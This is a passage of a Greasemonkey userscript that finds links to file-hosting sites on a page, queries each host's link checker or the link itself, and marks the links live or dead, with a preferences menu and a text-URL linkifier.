			params += ', menubar=no';
			params += ', resizable=no';
			params += ', scrollbars=no';
			params += ', status=no';
			params += ', toolbar=no';

			//var my_window = window.open("", "mywindow1", params);
			//my_window.document.write("Hello");

		    var btn_close = document.getElementById("tclc_close_prefs");
		    btn_close.addEventListener("click", update_prefs, false);
		
		    var btn_close1 = document.getElementById("tclc_close_prefs1");
		    btn_close1.addEventListener("click", update_prefs, false);
		
		    var btn_host_enable = document.getElementById("tclc_host_enable");
		    btn_host_enable.addEventListener("click", host_enable, false);
		    
		    var btn_host_disable = document.getElementById("tclc_host_disable");
		    btn_host_disable.addEventListener("click", host_disable, false);
		    
		    var btn_all_hosts_enable = document.getElementById("tclc_all_hosts_enable");
		    btn_all_hosts_enable.addEventListener("click", all_hosts_enable, false);
		    
		    var btn_all_hosts_disable = document.getElementById("tclc_all_hosts_disable");
		    btn_all_hosts_disable.addEventListener("click", all_hosts_disable, false);
		    
		    var btn_filehosts_update = document.getElementById("tclc_filehosts_update");
		    btn_filehosts_update.addEventListener("click", filehosts_update, false);
		}
		GM_registerMenuCommand("TCLC Preferences", show_prefs);
	} else {
		//GM_log("Not setting up User Script Commands.");
	}

	////////////////////////////////////////////////////////////////////////////////////////////////////////
	//    Misc Functions
	////////////////////////////////////////////////////////////////////////////////////////////////////////

	var get_hosts = function(){
		//GM_log("---------------------- this.get_hosts() - start");
		//GM_setValue("filehosts_loaded_date", 20090101);
		var d = new Date();
		var dy = d.getFullYear();
		var dm = d.getMonth() + 1;
		var dd = d.getDate();
		//Move out one month
		//if (dm > 11){
		//	dm = 1;
		//	dy = dy + 1;
		//} else {
		//	dm = dm + 1;
		//}
		var ys = new String(dy);
		var ms = new String(dm);
		var ds = new String(dd);
		if ( ms.length == 1 ) ms = "0" + ms;
		if ( ds.length == 1 ) ds = "0" + ds;
		ys = parseFloat(ys + ms + ds);
		
		var upd = GM_getValue("filehosts_loaded_date", 0);
		GM_log("filehosts_loaded_date: " + upd);
		
		//GM_log("upd: " + (upd == undefined));
		//GM_log("filehosts: " + (GM_getValue("filehosts") == undefined));
		
		if(ys > upd || upd == undefined || GM_getValue("filehosts") == undefined){
			//GM_log("Loading filehosts.");
		    GM_xmlhttpRequest({
		        method: "GET",
		        url: 'http://linkcheck.yahavatar.com/filehost_checks.txt',
		        headers:{'User-agent': 'Mozilla/4.0 (compatible) Greasemonkey', 'Content-type':'application/x-www-form-urlencoded'},
		        data:'',
		        onload:function(result) {
		        	
		        	//GM_log("Inside onload function!");
		        	GM_log("res: " + result.responseText);
		        	
		            var res = result.responseText;
		            var res = res.split("===== Div =====");
		            var hosts_data = res[1];
		            var redirs_data = res[2];
		            
		            GM_log("Hosts: " + res[1]);
		            GM_log("Redirs: " + res[2]);
		            
		            GM_setValue("filehosts", hosts_data);		//Store the filehost info
		            GM_setValue("redirectors", redirs_data);	//Store redirector data
		            GM_setValue("filehosts_loaded_date", ys);	//Update filehost load date
		            //fn_get_hosts_process();
		            get_hosts_process();
		        }
		    });
		} else {
			//GM_log("No need to load filehosts.");
			//fn_get_hosts_process();
			get_hosts_process();
		}
	}
	this.get_hosts = function(){
		get_hosts();
	}
	
	function fn_get_hosts_process(){
		//GM_log("fn_get_hosts_process()");
		get_hosts_process();
	}

	MouseOver = function(){
		other_alive = [];
		other_dead = [];
		other_maybe = [];
		other_link_qty = 0;
		other_links = [];
		rs_links = [];
		
		if (this.href.search(all_rapidshare_regex) != -1){
	        rs_links.push(this.href);
		} else {
		    for (var ii = 0; ii < hosts.length; ii++){							//Slightly inefficient. Should only address enabled hosts.
		        if (this.href.search(hosts[ii][1]) != -1) {						//	Could join hosts array but then not sure how to get index
		        	if (GMHosts.indexOf(hosts[ii][0] + "|") != -1){				//	for alive/dead/maybe regexs.???
		        		other_links.push(this);
		                other_link_qty = other_link_qty + 1;
		                other_alive.push(hosts[ii][2]);
		                other_dead.push(hosts[ii][3]);
		                other_maybe.push(hosts[ii][4]);
		        	}
		        }
		    }
		}
		if (rs_links.length > 0){rs_link_check(rs_links)};
	    if (other_links.length > 0){other_link_check(other_links)};
	}

	get_hosts_process = function(){
		//GM_log("get_hosts_process()");
		var hosts_data = GM_getValue("filehosts")
		hosts_data = hosts_data.split(ret + ret);
		for (var i = 1; i < hosts_data.length - 1; i++){
			var host_dets = hosts_data[i].split(ret);
			allHostsMatch = allHostsMatch + host_dets[1]
			if (i < hosts_data.length - 2){allHostsMatch = allHostsMatch + "|";}
			var hostStr = new RegExp(host_dets[1], "gi");
			arr_allHostsMatch.push(hostStr);
			var alive = new RegExp(host_dets[2], "gi");
			var dead = new RegExp(host_dets[3], "gi");
			var maybe = new RegExp(host_dets[4], "gi");
			hosts.push ([host_dets[0], hostStr, alive, dead, maybe]);
		}
		GMHosts = GM_getValue("hosts_enabled","");
		if (GMHosts == "" || GMHosts == "undefined" || GMHosts == undefined){
			for (var ii = 0; ii < hosts.length; ii++){
				var host = hosts[ii][0];
				GMHosts = GMHosts + host + "|";
			}
			GM_setValue("hosts_enabled", GMHosts);
		}
		GM_setValue("hosts_all", GMHosts);		
		allHostsMatch = new RegExp(allHostsMatch, "gi");
		get_redirs_process();
	}

	get_redirs_process = function(){
		//GM_log("get_redirs_process() start");
		
		var redirs_data = GM_getValue("redirectors", "").split(ret);
		for (var i = 1; i < redirs_data.length - 1; i++){
			redirs_regex = redirs_regex + redirs_data[i];
			if (i < redirs_data.length - 2){redirs_regex = redirs_regex + "|";}
		}
		redirs_regex = new RegExp(redirs_regex, "gi");
		//GM_log("redirs_regex: " + redirs_regex);
		//GM_log("get_redirs_regex() end");
		process_links();
	}

	process_links = function(){
		//GM_log("+++++++++++++++++++++++++++ Process Links()");
		//GM_log("pref1: " + pref1);
		
		//Take care of 'prettyprint mangled links:
		$(".prettyprint").each(function(){
			$(this).html($(this).html().replace(/<span class=\"(com|pln|pun|searchlite)\">|<\/span>/gi,''));
			//$(this).html($(this).html().replace('<span class="com">', ''));
			//$(this).html($(this).html().replace('<span class="pln">', ''));
			//$(this).html($(this).html().replace('<span class="pun">', ''));
			//$(this).html($(this).html().replace('<span class="searchlite">', ''));
			//$(this).html($(this).html().replace('</span>', ''));
		});
		
		if (pref1 == true){
			linkify();
		}
		var GMHosts = GM_getValue("hosts_enabled");
		var links = document.getElementsByTagName('a');
		var fs_links = [];
		var hf_links = [];
		var mu_links = [];
		var rs_links = [];
		var muid = 0;
	
		//GM_log("allHostsMatch: " + allHostsMatch);
		var URL = window.location.toString();
		//GM_log("window.location: " + URL);
		//GM_log("hosts_enabled: " + GMHosts);
	
		//If current page is a filehost page, do not process any links
		if (URL.search(allHostsMatch) == -1){
			//GM_log("URL not a filehost page");
			//GM_log("Links qty: " + links.length);
			for (var i = 0; i < links.length; i++){
			    var urll = links[i].href;
	   			//var winLoc = URL.split("/");
	   			//var winLoc = winLoc[0] + "//" + winLoc[2];
	   			
	   			//GM_log("Processing link: " + urll);
	   			//GM_log("	winLoc: " + winLoc);
	   			
				//if (urll.indexOf(winLoc) != -1){
				//	GM_log("skipping: " + urll);
				//	continue;
				//}
			    
			    count = count + 1;
			    urll = urll.replace(/%2F/gi,'/');
			    urll = urll.replace(/%3A/gi,':');

				//GM_log("urll: " + urll);
				if (urll.search(/\/anonym\.to/) != -1){
					urll = urll.replace(/http:\/\/anonym\.to\/\?/,'');
					links[i].href = urll;
				}
				//GM_log("		href: " + links[i].href);
				//GM_log("		urll: " + urll);

			    
			    //http://anonym.to/?http://www.fileserver.cc/3upelcgf2e0u.html
			    
			    //urll = urll.replace(/\?killcode=[\d]*/gi,'');
			    
			    //GM_log("urll: " + urll);
			    //GM_log("	match: " + urll.search(/(http:\/\/)*hotfile\.com/gi));
			
			    //Check for a valid image link
			    if (urll.substr(-4).search(img_exts_regex) != -1){ 					//Image links
			        if (pref5 == true && document.URL.search(cavern_regex) != -1){
			            if (links[i].href.search(imgs_regex) != -1) {
			                links[i].id = 'ok_img_link';
			            } else {
			                links[i].id = 'bad_img_link';
			            }
			        }
			    } else if (links[i].href.search(redirs_regex) != -1){    			//Redirector links
			        if (pref6 == true){links[i].id = "redr_link"};
			    } else {
			    	//GM_log("else");
			        if (pref8){links[i].addEventListener("mouseover", MouseOver, false)};
			        //Rapidshare file links
			        
			        //GM_log("Lin: " + links[i].href);
			        
			    	if (links[i].href.search(all_filesonic_regex) != -1){
			    		//GM_log("Filesonic link: " + urll);
			        	links[i].id = "a" + count;
			            var urll = links[i].href;
			            numberoffslinks++;
			            var myString = ''+numberoffslinks+'';
			            if (myString.search(/\d00/) != -1){
			            	fs_links.push('>>split<<');
			            }
			    		fs_links.push(urll);
			        } else if (links[i].href.search(all_hotfile_regex) != -1){
			        	links[i].id = "a" + count;
			            var urll = links[i].href;
			            numberofhflinks++;
			            var myString = ''+numberofhflinks+'';
			            if (myString.search(/\d00/) != -1){
			            	hf_links.push('>>split<<');
			            }
			    		hf_links.push(urll);
			        } else if (links[i].href.search(all_megaupload_regex) != -1){
						numberofmulinks++;
						urll = urll.replace(/^.*?http:\/\/www\.(?:megaupload|megarotic|megaporn)\.com\/(?:|..\/)\?d=/gi, 'id' + muid + '=');
						urll = urll.replace(/^.*?http%3A%2F%2Fwww\.(?:megaupload|megarotic|megaporn)\.com\/(?:|..\/)\?d=/gi, 'id' + muid + '=');
						urll = urll.replace(/%2F/gi, '/');
						urll = urll.replace(/%3A/gi, ':');
						urll = urll.replace(/%3F/gi, '?');
						urll = urll.replace(/%3D/gi, '=');
						muid++;
						var myString = '' + numberofmulinks + '';
						mu_links.push(urll);
			        } else if (links[i].href.search(all_rapidshare_regex) != -1){
			        	links[i].id = "a" + count;
			            var urll = links[i].href;
			            //GM_log("urll: " + urll);
			            numberofrslinks++;
			            var myString = ''+numberofrslinks+'';
			            if (myString.search(/\d00/) != -1){
			            	rs_links.push('>>split<<');
			            }
			           	rs_links.push(urll);
					} else {
			        	//GM_log("else 2");
			        	//GM_log("allHostsMatch: " + urll.search(allHostsMatch));
						if (urll.search(allHostsMatch) != -1){  				//Eliminates the need to loop through all hosts unless we know it's an other link.
							//GM_log("passed allHostsMatch: " + urll);
				            for (var ii = 0; ii < hosts.length - 1; ii++){		//  Inefficiency has been solved... somewhat.
				            	if (urll.search(hosts[ii][1]) != -1) {			//	Could join hosts array but then not sure how to get index
				            		
										//GM_log("	URL: " + urll);
										
				                	if (GMHosts.indexOf(hosts[ii][0] + "|") != -1){		//	Is host enabled?
				                		//GM_log ("Host is enabled: " + urll);
										links[i].id = "a" + count;
				                		other_links.push(links[i]);
				                        other_link_qty = other_link_qty + 1;
				                        other_alive.push(hosts[ii][2]);
				                        other_dead.push(hosts[ii][3]);
				                        other_maybe.push(hosts[ii][4]);
				                	}
				                }
				            }
			            }
			            
					}
			    }
			}
			if (pref8){
				//Do Nothing
			} else {
				//GM_log("hf_links.length: " + hf_links.length);
				if (fs_links.length > 0){
					var qty = fs_links.length;
					var odoa = String.fromCharCode(13) + String.fromCharCode(10);
					fs_links = fs_links.join(odoa);
					fs_link_check(fs_links, qty)
				};
				if (hf_links.length > 0){
					hf_links = hf_links.join();
					hf_links = hf_links.replace(/,/gi,'\n');
					var hf_links = hf_links.split(">>split<<");
					hf_link_check(hf_links)
				};
				if (mu_links.length > 0){
					mu_links = mu_links.join();
					mu_links = mu_links.replace(/,/gi,'&');
					var mu_links = mu_links.split(">>split<<");
					mu_link_check(mu_links)
				};
				if (rs_links.length > 0){
					//GM_log("rs_links: " + rs_links.length);
					//rs_links = rs_links.join();
					//rs_links = rs_links.replace(/,/gi,'\n');
					//var rs_links = rs_links.split(">>split<<");
					rs_link_check(rs_links)
				};
				if (other_links.length > 0){other_link_check(other_links);}
			}
		}
	}

	fs_link_check = function(fs_links, qty){
		//Always check for filesonic links. No reason not to check them if they exist.
		GM_xmlhttpRequest({
			method: "post",
			url: 'http://www.filesonic.com/link-checker',
			headers: {"Content-type": "application/x-www-form-urlencoded"},
			data: "redirect=/link-checker&links="+encodeURIComponent(fs_links)+"",  
			onload: function(result) {
				res = result.responseText;
				//Process the responses
				$("#files_status_tbl tr", res).each(function(){
					var html = "<div><table>" + $(this).html() + "</table></div>";	//Have to make html string a valid div.table
					if (html.search(/>Available</g) > -1){
						var filename = $("td.source span", html).html();
						$('a[href$="' + filename + '"]').attr("id","live_link");
					} else {
						$('a[href$="' + filename + '"]').attr("id","dead_link");
					}
				});
			}
		});
	}

	hf_link_check = function(hf_links){
		//GM_log("hf_link_check() - start");
		//It seems odd here that hf_links length always = 0...
		if (GMHosts.indexOf("hotfile.com|") != -1){
			GM_xmlhttpRequest({
				method: "post",
				url: 'http://hotfile.com/checkfiles.html',
				headers: {
					"Content-type": "application/x-www-form-urlencoded"
				},
				data: "files="+encodeURIComponent(hf_links)+"&but=+Check+Urls+",  
				onload: function(result) {
					res = result.responseText;
					res = res.replace(/\r\n/g,'');
					res = res.replace(/\n/g,'');
					res = res.replace(/\t/g,'');
					notfound = res.match(/http:\/\/(www\.)*hotfile\.com\/dl/gi);
					livelink = res.match(/<td><a href=\"(http\:\/\/hotfile\.com\/dl\/.*?)\">(?:http:\/\/hotfile\.com\/dl\/.*?)<\/a><\/td><td>(size|.*?)<\/td><td style=\"paddding-left\: 15px\;\" nowrap><span style=\"color\: green\">Existent<\/span>/g); 
					//Mark all files as deleted to begin with. 
					//   This relies on the livelink routine to mark the good ones as alive.
					//   This causes an issue as it will set some/all links to dead that are already alive.
					//   Had to check for 'alive' before setting 'dead' in DisplayLinks routines

					var notfoundlinks = new Array();
					for (var i = notfound.length - 1; i >= 0; i--) {
						var string = notfound[i];
						
						//GM_log("notfound[i]: " + notfound[i]);
						
						var regex = /http\:\/\/(www\.)*hotfile\.com\/dl/gi;	
						matchArrayff = string.match(regex);
						matchArrayfflink =  matchArrayff[1];
						
						//GM_log("matchArrayff[1]: " + matchArrayff[1]);
						
						//notfoundlinks.push(matchArrayfflink);
						notfoundlinks.push(notfound[i]);
					}
					if (notfoundlinks) {
						diplayTheDeletedLinks(notfoundlinks);
					}
	
					if (livelink) {
						var livelinklinks = new Array();
						for (var i = livelink.length - 1; i >= 0; i--) {
							var string = livelink[i];
							var regex2 = /<td><a href=\"(http\:\/\/hotfile\.com\/dl\/.*?)\/(.*?)\">(?:http:\/\/hotfile\.com\/dl\/.*?)\/(.*?)<\/a><\/td><td>(size|.*?)<\/td><td style=\"paddding-left\: 15px\;\" nowrap><span style=\"color\: green\">Existent<\/span>/;
							matchArraylive = string.match(regex2);
							var hffilename1 = matchArraylive[2].replace(/.*\/(.*?$)/,'$1');
							livelinklinks.push(matchArraylive[1]);
						}
						if (livelinklinks) {
							diplayTheLiveLinks(livelinklinks);
						} 
					}
				}			  
			});
		}
	}

	mu_link_check = function(mu_links){
		//GM_log("mu_link_check() - start");
		if (GMHosts.indexOf("megaupload.com|") != -1){
			for (var i = mu_links.length - 1; i >= 0; i--) { // can check 10000 Bites of links so all.join('\n').length <= 10000
	
				//GM_log("megaupload link: " + mu_links);
	
				datas = mu_links[i];
				GM_xmlhttpRequest({
					method: "post",
					url: 'http://megaupload.com/mgr_linkch' + 'eck.php',
					headers: {
						"Content-type": "text/html"
					},
					data: datas,
					onload: function(result) {
						res = result.responseText;					
						res = res.replace(/\d=www.megaupload.com&\d=www.megaporn.com/, '');
						var recieved = new Array();
						recieved = res.split('&id');
						var pagelinks = new Array();
						pagelinks = datas.split('id');
						var alltogethernow = new Array();
						for (var y = recieved.length - 1; y >= 0; y--) {
							pagelinks[y] = 'file' + pagelinks[y];
							alltogethernow.push(pagelinks[y] + '=' + recieved[y]);
						}
						alltogethernowstr = alltogethernow.join('+');
						livelink = alltogethernowstr.match(/file\d{1,}=(........)(?:&|)=\d{1,}=0&s=(\d*)&d=\d&n=(.*?)\+/g);
						notfound = alltogethernowstr.match(/file\d{1,}=(........)(?:&|)=\d{1,}=1/g);
						tempanav = alltogethernowstr.match(/file\d{1,}=(........)(?:&|)=\d{1,}=3/g);
						if (notfound){
							var notfoundlinks = new Array();
							for (var i = notfound.length - 1; i >= 0; i--) {
								var string = notfound[i];
								var regex = /file\d{1,}=(........)(?:&|)=\d{1,}=1/;
								matchArray = string.match(regex);
								notfoundlinks.push(matchArray[1]);
							}
							if (notfoundlinks) {
								diplayTheDeletedLinks(notfoundlinks);
							}
						}
						if (tempanav){
							var tempanavlinklinks = new Array();
							for (var i = tempanav.length - 1; i >= 0; i--) {
								var string = tempanav[i];
								var regex = /file\d{1,}=(........)(?:|&)=\d{1,}=3/;
								matchArray = string.match(regex);
								tempanavlinklinks.push(matchArray[1]);
							}
							if (tempanavlinklinks) {
								this.iplayTheDeletedLinks(tempanavlinklinks);
							}
						}
						if (livelink){
							var livelinklinks = new Array();
							for (var i = livelink.length - 1; i >= 0; i--) {
								var string = livelink[i];
								var regex = /file\d{1,}=(........)(?:&|)=\d{1,}=0&s=(\d*)&d=\d&n=(.*?)\+/;
								matchArray = string.match(regex);
								livelinklinks.push(matchArray[1]);
							}
							if (livelinklinks) {
								diplayTheLiveLinks(livelinklinks);
							} 
						}
						//GM_log("Done with mu");
					}
				});
			}
		}
	}

	rs_link_check = function(rs_links){
		//GM_log("rs_link_check() - start");
		if (GMHosts.indexOf("rapidshare.com|") != -1){
	
			//url: 'http://rapidshare.com/cgi-bin/checkfiles.cgi',
			//data:'urls='+encodeURIComponent(rs_links[i]),
			
			//http://rapidshare.com/#!rapidtools/rapidtools_rsc
			//https://api.rapidshare.com/cgi-bin/rsapi.cgi?sub=checkfiles_v1&files=409378347,409378347,410609452,411140720,411141687&filenames=IMG_0770.jpg.html,IMG_0770.jpg.html,test2.zip.html,test.zip.html,RapidShareManagerSetup.exe&cbf=RSAPIDispatcher&cbid=1
			
			//Let's build the RS strings
			var rsNumber = [];
			var rsString = [];
			for (var i = 0; i < rs_links.length; i++) {
				var aNum = rs_links[i].match(/\d{6,}/);
				rsNumber.push(aNum);
	
				//split strings
				var rs_explode = rs_links[i].split("/");
				//alert(rs_links[i] + ": " + rs_explode[rs_explode.length - 1]);
				rsString.push(rs_explode[rs_explode.length - 1]);
			}
			var rsNumberCombined = rsNumber.join("%2c");
			var rsStringCombined = rsString.join("%2c");
			//GM_log(rsNumberCombined);
			//GM_log(rsStringCombined);
			
		    //for (var i = rs_links.length - 1; i >= 0; i--) {
		    
		    
		    //RSAPIDispatcher(1,"415364207,PleaseLady_JBd.part1.rar,104857000,905,1,dt,0\n
		    //                   415366973,PleaseLady_JBd.part2.rar,104857000,429,1,cg,0\n
		    //                   415369248,PleaseLady_JBd.part3.rar,53294366,801,1,l35,0\n
		    //                   114153692,thisisabad.link.rar,0,0,0,0,0\n");
		    
		    
		          GM_xmlhttpRequest({
		            method: "GET",
		            url: 'https://api.rapidshare.com/cgi-bin/rsapi.cgi?sub=checkfiles&files=' + rsNumberCombined + "&filenames=" + rsStringCombined + "&cbf=RSAPIDispatcher&cbid=1",
		            headers:{'User-agent': 'Mozilla/4.0 (compatible) Greasemonkey', 'Content-type':'application/x-www-form-urlencoded'},
		            onload:function(result) {
		                var res = result.responseText;
		                
		                //GM_log("res: " + res);

		                //See if link is alive in the response
		                var livelinklinks = new Array();  
		                var notfoundlinks = new Array();  
		                for (var i = 0; i < rs_links.length; i++) {
		                	//GM_log("	" + rsString[i] );
		                	var rsReg = new RegExp(rsString[i].replace(/\./g,'\\.') + "\,\\d+\,\\d+\,(4|0)","gi");
		                	//GM_log("	" + rsReg);
		                	//GM_log("		" + res.search(rsReg));
		                	if (res.search(rsReg) > -1) {
		                	//if (res.indexOf(rsString[i] + ",0,0,0,0") > -1) {
		                		//Dead link
		                		//GM_log("RS link - Dead: " + rsString[i]);
		                		notfoundlinks.push(rs_links[i]);
		                	} else {
		                		//Alive Link
		                		//GM_log("RS link - Live: " + rsString[i]);
		                		livelinklinks.push(rs_links[i]);
		                	}
		            	}
		            	if (livelinklinks.length > 0){
							diplayTheLiveLinks(livelinklinks);
						}	
		            	if (notfoundlinks.length > 0){
							diplayTheDeletedLinks(notfoundlinks);
						}
		                
		              	//GM_log("RS end");
		              }
		         });
		    //}
		}
	}
	function diplayTheDeletedLinks(notfoundlinks){
		//GM_log("notfoundlinks.join(\): " + notfoundlinks.join('...'));
	    var xpathofnotfoundlinks = "//a[contains(@href,\'" + notfoundlinks.join('\') or contains(@href,\'') +"\')]";
	    var allLinks, thisLink;
	    allLinks = document.evaluate( xpathofnotfoundlinks, document,null,XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,null);
	    for (var i = 0; i < allLinks.snapshotLength; i++) {
	        var thisLink = allLinks.snapshotItem(i);
			if(thisLink.id != 'live_link'){thisLink.id = 'dead_link';}
	      }
	}
	function diplayTheLiveLinks(livelinklinks){
	    var xpathoflivelinklinks = "//a[contains(@href,\'" + livelinklinks.join('\') or contains(@href,\'') +"\')]";
	    var allliveLinks, thisLink;
	    allliveLinks = document.evaluate( xpathoflivelinklinks,    document,null,XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,null);
	    for (var i = 0; i < allliveLinks.snapshotLength; i++) {
	        var thisLink = allliveLinks.snapshotItem(i);
			thisLink.id = 'live_link';
	     }
	}

	other_link_check = function(other_links){
	    for (var i = 0; i < other_links.length; i++){
	        var file_is_alive = other_alive[i];
	        var file_is_dead = other_dead[i];
	        var file_is_maybe = other_maybe[i];
	        var URL = other_links[i].href;
	        var URLid = other_links[i].id;
	        //GM_log("	Other URL: " + URL);
	        //GM_log("	Other file_is_alive: " + file_is_alive);
	        //GM_log("	Other file_is_dead: " + file_is_dead);
	        //GM_log("	Other file_is_maybe: " + file_is_maybe);
	        var ret = other_get_url(URL, URLid, file_is_alive, file_is_dead, file_is_maybe);
	    }
	    other_links = null;
	}

	other_get_url = function(URL, URLid, file_is_alive, file_is_dead, file_is_maybe){
		//When method was POST, some checks were invalid. They seemed to come back blank.
	    GM_xmlhttpRequest({
	        method: 'GET',
	        url: URL,
	        headers: { 'User-agent': 'Mozilla/4.0 [en] (Windows NT 6.0; U)', },
	        onload: function(responseDetails) {
	        	//GM_log(responseDetails.responseText);
	        	//try{
		            if (file_is_dead != '/""/gi' && responseDetails.responseText.search(file_is_dead) > -1){
		            	//GM_log("Dead Link: " + responseDetails.responseText);
		                document.getElementById(URLid).id = 'dead_link';
		            } else if (file_is_alive != '/""/gi' && responseDetails.responseText.search(file_is_alive) > -1){
		            	//GM_log("Live Link: " + responseDetails.responseText);
		                document.getElementById(URLid).id = 'live_link';
		            } else if (file_is_maybe != '/""/gi' && responseDetails.responseText.search(file_is_maybe) > -1){
		            	document.getElementById(URLid).id = 'mayb_link';
		            } else {	//Unknown link
						//GM_log("	Other URL: " + URL);
						//GM_log("	Other file_is_alive: " + file_is_alive);
						//GM_log("	Other file_is_dead: " + file_is_dead);
						//GM_log("	Other file_is_maybe: " + file_is_maybe);
		            	//GM_log("Unknown Link: " + responseDetails.responseText);
		            	document.getElementById(URLid).id = 'dead_link';
		            }
		            //GM_log("+ NO error getting URL: " + URL + "  id: " + URLid);
	        	//} catch (err){
	        		//GM_log("- error getting URL: " + URL + "  id: " + URLid);
	    		//}
	        }
	    });
	}

	linkify = function(){
		//GM_log("linkify()");
	    try{
	        var regex = /((?:https?|ftp):\/\/[^\s'"'<>()]*|[-\w.+]+@(?:[-\w]+\.)+[\w]{2,6})/gi;
	        var regex_exclude_html_trunc = /http:\/\/uploading\.com|http:\/\/letitbit.net|http:\/\/www\.gshare\.com|http:\/\/netload\.in/gi;
	        var regex_ends = /\.rar\.html\b/gi;
	        var mail_addr = /\@/;
	        var altText, txt, muligtLink;
	        var OKTags = ['a', 'head', 'script', 'style', 'title', 'option', 'textarea'];
	        var path = "//text()[not(parent::" + OKTags.join(" or parent::") +")]";
	        altText = document.evaluate(path, document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
	        for(var i=0;i<altText.snapshotLength;i++){
	            txt = altText.snapshotItem(i);
	            muligtLink = txt.nodeValue;
	            
	            if(regex.test(muligtLink)){            	
	                var span = document.createElement('span');
	                var lastLastIndex = 0;
	                regex.lastIndex = 0;
	                
	                //GM_log("muligtLink: " + muligtLink);
	                
	                for(myArray = null; myArray = regex.exec(muligtLink); ){
	                    var link = myArray[0];
	                    
	                    //GM_log("link: " + link);
	                    
	                    if (mail_addr.test(link)){0
							//Do Nothing
	                    } else {
	                        span.appendChild(document.createTextNode(muligtLink.substring(lastLastIndex, myArray.index)));
	                        var href = link;	
	                        
	                        //GM_log("href: " + href);                        
	                        
	                        var prefix = '';
	                        if(href.length > 7){
	                            prefix = href.substring(0,7);
	                            if(prefix.toLowerCase() != 'http://' && prefix.toLowerCase() != 'https:/'){
	                                href = 'http://' + href;
	                            }
	                        }
	                        //Fix links that end in .rar.html
	                        if (href.search(regex_exclude_html_trunc) == -1){
	                            if (href.search(regex_ends) != -1){
	                                href = href.substr(0, href.length - 5);
	                            }
	                        }
	                        var a = document.createElement('a');
	                        a.setAttribute('href', href);
	                        var orig_href = href;
	                        a.appendChild(document.createTextNode(href));
	                        span.appendChild(a);
	                        lastLastIndex = regex.lastIndex;
	                    }
	                }
	                span.appendChild(document.createTextNode(muligtLink.substring(lastLastIndex)));
	                txt.parentNode.replaceChild(span, txt);
	            }
	        }
	    } catch(e){alert(e);}
	}

}

//Let's start
try{
    //GM_log("Testing browser...");
    var test = browser;
    //GM_log("After Testing browser...");
    switch (browser){
    	case "FF":
    		GM_log("Yah's Linkchecker for Firefox");
		    var ylc = new yahslinkchecker("FF");
    		ylc.check_version = null;		// Overloaded function to prevent access
    		var start = ylc.get_hosts();	// Start with get_hosts() when using Yah's Linkchecker for Firefox
    		break;
    }

} catch(err){
    //GM_log("Processing as GM Script");
    var ylc = new yahslinkchecker("GM");
    var start = ylc.check_version();
}